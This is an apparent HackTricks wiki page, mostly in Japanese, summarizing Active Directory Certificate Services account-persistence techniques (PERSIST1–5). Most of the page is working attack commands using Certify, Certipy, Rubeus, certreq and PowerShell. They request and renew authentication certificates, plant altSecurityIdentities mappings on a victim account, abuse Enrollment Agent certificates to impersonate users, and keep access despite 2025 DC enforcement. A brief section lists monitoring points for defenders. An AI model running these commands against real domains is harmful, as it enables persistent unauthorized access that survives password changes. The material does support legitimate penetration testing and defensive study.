# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**これは、[https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) の優れた調査にある account persistence の章を簡単にまとめたものです**

## Certificates を使った Active User Credential Theft の理解 – PERSIST1

domain authentication を許可する certificate をユーザーが request できる状況では、attacker はその certificate を request して盗み、network 上で persistence を維持する機会を得ます。デフォルトでは、Active Directory の `User` template はそのような request を許可していますが、無効化されている場合もあります。

[Certify](https://github.com/GhostPack/Certify) または [Certipy](https://github.com/ly4k/Certipy) を使って、client authentication を許可する有効な templates を search し、そのうちの1つを request できます:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
証明書の強みは、パスワードが変更されても、証明書が有効である限り、その証明書が属するユーザーとして認証できる点にあります。

PEMをPFXに変換し、それを使ってTGTを取得できます：
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Note: 他の技術（THEFT セクションを参照）と組み合わせると、certificate-based auth により、LSASS に触れずに、さらに非昇格コンテキストからでも永続的なアクセスが可能になる。

## Certificates を使った Machine の永続化の取得 - PERSIST2

攻撃者がホスト上で昇格権限を持っている場合、デフォルトの `Machine` template を使用して、侵害したシステムの machine account に certificate を enroll できる。machine として認証すると、ローカルサービスに対して S4U2Self を実行でき、永続的な host persistence を提供できる:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## 証明書更新による永続化の拡張 - PERSIST3

証明書テンプレートの有効期間と更新期間を悪用すると、攻撃者は長期的なアクセスを維持できる。以前に発行された証明書とその秘密鍵を持っていれば、有効期限前にそれを更新して、新しい長期有効な資格情報を取得できる。元のプリンシパルに紐づく追加の要求アーティファクトを残す必要はない。
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Operational tip: attackerが保持するPFXファイルの有効期限を追跡し、早めに更新してください。更新によって、証明書に modern SID mapping extension が含まれるようになり、より厳格なDC mapping rulesの下でも使い続けられる場合があります（次のセクションを参照）。

## Planting Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4

target account の `altSecurityIdentities` attribute に書き込めるなら、attackerが制御する証明書をその account に明示的に map できます。これは password 変更後も持続し、strong mapping formats を使う場合は modern DC enforcement 下でも機能し続けます。

High-level flow:

1. 自分で制御できる client-auth certificate を取得または発行する（例: `User` template を自分として enroll する）。
2. cert から強い identifier を抽出する（Issuer+Serial、SKI、または SHA1-PublicKey）。
3. その identifier を使って、victim principal の `altSecurityIdentities` に explicit mapping を追加する。
4. 自分の certificate で authenticate する。DC は explicit mapping を介してそれを victim に map する。

Example (PowerShell) using a strong Issuer+Serial mapping:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
それから PFX で authenticate します。Certipy は TGT を直接取得します:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### 強力な `altSecurityIdentities` マッピングの構築

実際には、**Issuer+Serial** と **SKI** マッピングが、攻撃者が保持する証明書から構築するうえで最も簡単な強力形式です。これは、DC が既定で **Full Enforcement** になり、弱いマッピングが信頼できなくなる **2025年2月11日** 以降に重要になります。
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Notes
- `X509IssuerSerialNumber`, `X509SKI`, または `X509SHA1PublicKey` のみを使う強いマッピング形式を使用してください。弱い形式（Subject/Issuer、Subject-only、RFC822 email）は非推奨で、DCポリシーでブロックされる可能性があります。
- このマッピングは **user** と **computer** の両方のオブジェクトで機能するため、computer account の `altSecurityIdentities` への write access があれば、その machine として永続化するのに十分です。
- cert chain は、DC により trusted な root まで構築できる必要があります。NTAuth 内の Enterprise CAs は通常 trusted です。環境によっては public CAs も trusted されています。
- Schannel authentication は、DC が Smart Card Logon EKU を持たない、または `KDC_ERR_PADATA_TYPE_NOSUPP` を返す場合でも、PKINIT が失敗したときの persistence に引き続き有用です。

#### 2025+ `Issuer/SID` explicit mappings

**Windows Server 2022+** の domain controllers で **September 9, 2025** の security update が適用されている場合、Microsoft は persistence に適した別の強い explicit mapping format を追加しました。これは同じ CA からの certificate reissuance 後も維持されるためです:
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
運用上、これは古い強い形式とは異なります:
- `Issuer+Serial` は **1つの特定の証明書** を固定します。
- `SKI` / `SHA1-PUKEY` は **1つの鍵ペア** を固定します。
- `Issuer/SID` は **発行CA + 対象SID** を固定するため、同じCAから再発行または更新された証明書でも、`altSecurityIdentities` を書き換えずにそのまま使えます。

要件と注意点
- ログオンに提示される証明書には、SID security extension 内に対象アカウントのSIDが実際に含まれていなければなりません。
- この形式は、SID extension を省略する `ESC9` / `ESC16` 系の証明書には有用ではありません。その場合は `Issuer+Serial`、`SKI`、または `SHA1-PUKEY` に戻してください。

弱い explicit mappings と攻撃経路の詳細は、以下を参照してください:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

有効な Certificate Request Agent/Enrollment Agent 証明書を取得できれば、ユーザーの代わりに自由に新しいログオン可能な証明書を発行でき、agent の PFX をオフラインで persistence token として保持できます。悪用のワークフロー:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
この永続化を排除するには、agent certificate または template permissions の失効が必要です。

Operational notes
- Modern `Certipy` versions support both `-on-behalf-of` and `-renew`, so an attacker holding an Enrollment Agent PFX can mint and later renew leaf certificates without re-touching the original target account.
- If PKINIT-based TGT retrieval is not possible, the resulting on-behalf-of certificate is still usable for Schannel authentication with `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## PKINIT が失敗する場合に Persisted Certificates を使う

DC に Smart Card Logon-capable certificate がない場合、PKINIT 経由の certificate logon は `KDC_ERR_PADATA_TYPE_NOSUPP` で失敗することがあります。これは永続化プリミティブを無効化しません。同じ PFX は、Schannel 認証された LDAP access に引き続き使えることが多いです。
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
This is especially useful after PERSIST4/PERSIST5 because you can keep operating from Linux/macOS and chain other directory persistence actions such as dropping [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) or editing writable delegation attributes.

## 2025 Strong Certificate Mapping Enforcement: 永続化への影響

Microsoft KB5014754 は、ドメインコントローラーに Strong Certificate Mapping Enforcement を導入しました。**2025年2月11日**以降、DC は弱い/曖昧なマッピングに対して既定で **Full Enforcement** となり、さらに **2025年9月9日** のセキュリティ更新以降、修正済みの DC は旧来の Compatibility-mode フォールバックをサポートしなくなりました。実務上の影響は次のとおりです。

- SID マッピング拡張を持たない 2022 年以前の証明書は、DC が Full Enforcement の場合に暗黙的なマッピングに失敗することがあります。攻撃者は、AD CS を通じて証明書を更新して SID 拡張を取得するか、`altSecurityIdentities` に強い明示的マッピングを仕込む（PERSIST4）ことでアクセスを維持できます。
- 強い形式（`Issuer+Serial`、`SKI`、`SHA1-PUKEY`、および最新の DC では `Issuer/SID`）を使った明示的マッピングは引き続き機能します。弱い形式（Issuer/Subject、Subject-only、RFC822）はブロックされる可能性があり、永続化には避けるべきです。
- 弱いマッピングがまだ機能しているように見える場合は、信頼できる長期永続化経路ではなく、パッチ未適用または別設定の DC に当たっていると考えてください。
- SID 拡張を抑止する `ESC9` / `ESC16` 系の発行経路では `Issuer/SID` は使えないため、フォールバックとしての強いマッピング、または通常のテンプレート経由での更新が実用的な永続化オプションになります。

管理者は以下を監視し、アラートを出すべきです。
- `altSecurityIdentities` の変更、および Enrollment Agent と User 証明書の発行/更新。
- 代理申請（on-behalf-of）リクエストと異常な更新パターンに関する CA の発行ログ。

## References

- [Microsoft Support – KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [Almond Offensive Security – Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [Microsoft Community Hub – Introducing a new Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)

{{#include ../../../banners/hacktricks-training.md}}
